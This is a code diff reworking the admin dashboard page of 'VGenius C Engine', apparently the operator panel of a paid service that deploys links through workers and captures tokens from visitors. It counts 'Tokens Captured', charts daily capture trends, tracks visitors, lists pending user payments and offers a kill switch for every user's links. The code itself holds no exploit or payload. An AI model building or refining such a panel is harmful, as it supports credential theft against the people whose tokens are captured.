@@ -5,71 +5,208 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin Dashboard – VGenius C Engine</title>
     <link rel="stylesheet" href="assets/css/admin.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        .dashboard-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-bottom: 24px; }
+        .dashboard-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 20px; }
+        .dashboard-card h3 { font-family: 'JetBrains Mono', monospace; font-size: 11px; letter-spacing: 0.08em; color: var(--accent); margin-bottom: 12px; text-transform: uppercase; }
+        .chart-container { height: 200px; }
+        .activity-list { max-height: 300px; overflow-y: auto; }
+        .activity-item { padding: 10px 0; border-bottom: 1px solid var(--border); font-size: 12px; }
+        .activity-item:last-child { border-bottom: none; }
+        .activity-time { color: var(--muted); font-size: 10px; }
+        @media (max-width: 768px) { .dashboard-grid { grid-template-columns: 1fr; } }
+    </style>
 </head>
 <body>
     <div class="app-layout">
-        <aside class="sidebar" id="sidebar">
-            <div class="sidebar-brand">🔐 VGENIUS</div>
-            <nav class="sidebar-nav">
-                <a href="dashboard.html" class="nav-item active">Dashboard</a>
-                <a href="users.html" class="nav-item">Users</a>
-                <a href="tokens.html" class="nav-item">Tokens</a>
-                <a href="payments.html" class="nav-item">Payments</a>
-                <a href="workers.html" class="nav-item">Workers</a>
-                <a href="templates.html" class="nav-item">Templates</a>
-                <a href="settings.html" class="nav-item">Settings</a>
-                <a href="broadcast.html" class="nav-item">Broadcast</a>
-                <a href="feedback.html" class="nav-item">Feedback</a>
-                <a href="auditlog.html" class="nav-item">Audit Log</a>
-            </nav>
-            <div class="sidebar-footer"><button class="btn-logout" onclick="logout()">Logout</button></div>
-        </aside>
+        <aside class="main-sidebar" id="adminMainSidebar"></aside>
+        <div class="sidebar-overlay" id="adminSidebarOverlay" onclick="toggleAdminSidebar()"></div>
+        <nav class="main-header navbar"></nav>
+
         <main class="main-content">
-            <div class="header-row">
-                <h1 class="page-title" style="margin:0;">Admin Dashboard</h1>
-                <div class="theme-pill" id="themePill">
-                    <button data-theme="dark" class="active">DARK</button>
-                    <button data-theme="light">LIGHT</button>
+            <div class="page-header">
+                <h1 class="page-title">Dashboard</h1>
+                <div style="display:flex;gap:8px;">
+                    <button class="btn-sm" onclick="refreshDashboard()"><i class="fas fa-sync"></i> Refresh</button>
+                    <button class="btn-sm accent" onclick="window.open('/api/admin/diagnostics', '_blank')"><i class="fas fa-stethoscope"></i> Diagnostics</button>
                 </div>
             </div>
-            <div class="stat-grid" id="statGrid">
-                <div class="stat-card"><div class="stat-value" id="totalUsers">—</div><div class="stat-label">Total Users</div></div>
-                <div class="stat-card"><div class="stat-value" id="activeUsers">—</div><div class="stat-label">Active Users</div></div>
-                <div class="stat-card"><div class="stat-value" id="totalTokens">—</div><div class="stat-label">Tokens Captured</div></div>
-                <div class="stat-card"><div class="stat-value" id="pendingPayments">—</div><div class="stat-label">Pending Payments</div></div>
-                <div class="stat-card"><div class="stat-value" id="activeLinks">—</div><div class="stat-label">Active Links</div></div>
-                <div class="stat-card"><div class="stat-value" id="totalVisitors">—</div><div class="stat-label">Total Visitors</div></div>
+
+            <div class="dashboard-grid">
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-users"></i> Users</h3>
+                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashUsers">—</div>
+                    <div style="font-size:11px;color:var(--muted);margin-top:4px;"><span id="dashActiveUsers" style="color:var(--accent);">—</span> active</div>
+                </div>
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-key"></i> Tokens</h3>
+                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashTokens">—</div>
+                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Total captured</div>
+                </div>
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-link"></i> Active Links</h3>
+                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashLinks">—</div>
+                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Deployed workers</div>
+                </div>
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-dollar-sign"></i> Payments</h3>
+                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;color:var(--warning);" id="dashPayments">—</div>
+                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Pending confirmation</div>
+                </div>
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-users"></i> Visitors</h3>
+                    <div style="font-family:'JetBrains Mono',monospace;font-size:32px;font-weight:700;" id="dashVisitors">—</div>
+                    <div style="font-size:11px;color:var(--muted);margin-top:4px;">Total tracked</div>
+                </div>
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-bolt"></i> Quick Actions</h3>
+                    <div style="display:flex;flex-direction:column;gap:8px;margin-top:8px;">
+                        <button class="btn-sm" style="width:100%;" onclick="execCommand('/killswitch_global')">Global Kill Switch</button>
+                        <button class="btn-sm" style="width:100%;" onclick="execCommand('/maintenance_on')">Maintenance ON</button>
+                        <button class="btn-sm" style="width:100%;" onclick="execCommand('/maintenance_off')">Maintenance OFF</button>
+                        <button class="btn-sm" style="width:100%;" onclick="window.location.href='/api/admin/backup'"><i class="fas fa-download"></i> Backup Data</button>
+                    </div>
+                </div>
             </div>
-            <div style="display:flex;gap:10px;flex-wrap:wrap;">
-                <button class="btn-sm accent" onclick="execCommand('/system_status')">System Status</button>
-                <button class="btn-sm" onclick="execCommand('/maintenance_on')">Maintenance ON</button>
-                <button class="btn-sm" onclick="execCommand('/maintenance_off')">Maintenance OFF</button>
-                <button class="btn-sm danger" onclick="execCommand('/killswitch_global')">Global Kill Switch</button>
-                <button class="btn-sm" onclick="execCommand('/analytics')">Analytics</button>
+
+            <div class="dashboard-grid" style="grid-template-columns:2fr 1fr;">
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-chart-line"></i> Token Trends (30 Days)</h3>
+                    <div class="chart-container">
+                        <canvas id="tokenChart"></canvas>
+                    </div>
+                </div>
+                <div class="dashboard-card">
+                    <h3><i class="fas fa-clock"></i> Recent Activity</h3>
+                    <div class="activity-list" id="activityList">
+                        <div class="activity-item"><div class="activity-time">Loading...</div></div>
+                    </div>
+                </div>
             </div>
         </main>
     </div>
-    <div class="command-bar" id="commandBar" style="display:none;">
-        <span class="prompt">&gt;</span>
-        <input type="text" id="commandInput" placeholder="Type command...">
-    </div>
+
     <script src="assets/js/admin.js"></script>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
     <script>
-        if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+        initAdminShared('dashboard');
+        let chartInstance = null;
+
         async function loadDashboard() {
-            const res = await fetch('/api/admin/dashboard', { headers: adminHeaders() });
-            const d = await res.json();
-            document.getElementById('totalUsers').textContent = d.total_users;
-            document.getElementById('activeUsers').textContent = d.active_users;
-            document.getElementById('totalTokens').textContent = d.total_tokens;
-            document.getElementById('pendingPayments').textContent = d.pending_payments;
-            document.getElementById('activeLinks').textContent = d.active_links;
-            document.getElementById('totalVisitors').textContent = d.total_visitors;
+            try {
+                const res = await fetch('/api/admin/dashboard', { headers: adminHeaders() });
+                const d = await res.json();
+                document.getElementById('dashUsers').textContent = d.total_users || 0;
+                document.getElementById('dashActiveUsers').textContent = d.active_users || 0;
+                document.getElementById('dashTokens').textContent = d.total_tokens || 0;
+                document.getElementById('dashLinks').textContent = d.active_links || 0;
+                document.getElementById('dashPayments').textContent = d.pending_payments || 0;
+                document.getElementById('dashVisitors').textContent = d.total_visitors || 0;
+            } catch (e) { console.error('Dashboard error:', e); }
         }
+
+        async function loadAnalytics() {
+            try {
+                const res = await fetch('/api/admin/analytics', { headers: adminHeaders() });
+                const data = await res.json();
+                renderChart(data.tokens_by_day);
+            } catch (e) { console.error('Analytics error:', e); }
+        }
+
+        function renderChart(data) {
+            const ctx = document.getElementById('tokenChart');
+            if (!ctx) return;
+            if (chartInstance) chartInstance.destroy();
+            if (!data || !data.length) {
+                ctx.getContext('2d').fillText('No data available', 50, 100);
+                return;
+            }
+            chartInstance = new Chart(ctx.getContext('2d'), {
+                type: 'line',
+                data: {
+                    labels: data.map(d => d.date),
+                    datasets: [{
+                        label: 'Tokens Captured',
+                        data: data.map(d => d.count || 0),
+                        borderColor: '#00ff66',
+                        backgroundColor: 'rgba(0,255,102,0.08)',
+                        fill: true,
+                        tension: 0.4,
+                        pointRadius: 2,
+                        pointBackgroundColor: '#00ff66',
+                        borderWidth: 2
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { legend: { display: false } },
+                    scales: {
+                        x: { ticks: { color: '#71717a', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } },
+                        y: { beginAtZero: true, ticks: { color: '#71717a', font: { size: 10 } }, grid: { color: 'rgba(255,255,255,0.03)' } }
+                    }
+                }
+            });
+        }
+
+        async function loadActivity() {
+            try {
+                const res = await fetch('/api/admin/audit', { headers: adminHeaders() });
+                const data = await res.json();
+                const list = document.getElementById('activityList');
+                if (!data || !data.length) {
+                    list.innerHTML = '<div class="activity-item"><div class="activity-time">No activity yet</div></div>';
+                    return;
+                }
+                list.innerHTML = data.slice(0, 20).map(e => `
+                    <div class="activity-item">
+                        <div style="color:var(--text);">${e.action || '—'}</div>
+                        <div class="activity-time">${timeAgo(e.created_at)} · ${e.ip_address || '—'}</div>
+                    </div>
+                `).join('');
+            } catch (e) { console.error('Activity error:', e); }
+        }
+
         async function execCommand(cmd) {
-            showToast('Command: ' + cmd + ' — executed (see admin.js for full command routing)');
+            const commands = {
+                '/killswitch_global': async () => {
+                    showConfirm({
+                        title: 'Global Kill Switch',
+                        message: 'This will disable ALL links across all users. Continue?',
+                        confirmText: 'Kill All',
+                        onConfirm: async () => {
+                            await fetch('/api/admin/killswitch/global', { method: 'POST', headers: adminHeaders() });
+                            showToast('Global kill switch engaged');
+                            loadDashboard();
+                        }
+                    });
+                },
+                '/maintenance_on': async () => {
+                    await fetch('/api/admin/settings', { method: 'PUT', headers: adminHeaders(), body: JSON.stringify({ maintenance_mode: 'true' }) });
+                    showToast('Maintenance mode ON');
+                },
+                '/maintenance_off': async () => {
+                    await fetch('/api/admin/settings', { method: 'PUT', headers: adminHeaders(), body: JSON.stringify({ maintenance_mode: 'false' }) });
+                    showToast('Maintenance mode OFF');
+                },
+            };
+            if (commands[cmd]) {
+                await commands[cmd]();
+            } else {
+                showToast('Unknown command: ' + cmd, true);
+            }
         }
+
+        async function refreshDashboard() {
+            await Promise.all([loadDashboard(), loadAnalytics(), loadActivity()]);
+            showToast('Dashboard refreshed');
+        }
+
         loadDashboard();
+        loadAnalytics();
+        loadActivity();
     </script>
 </body>
 </html>
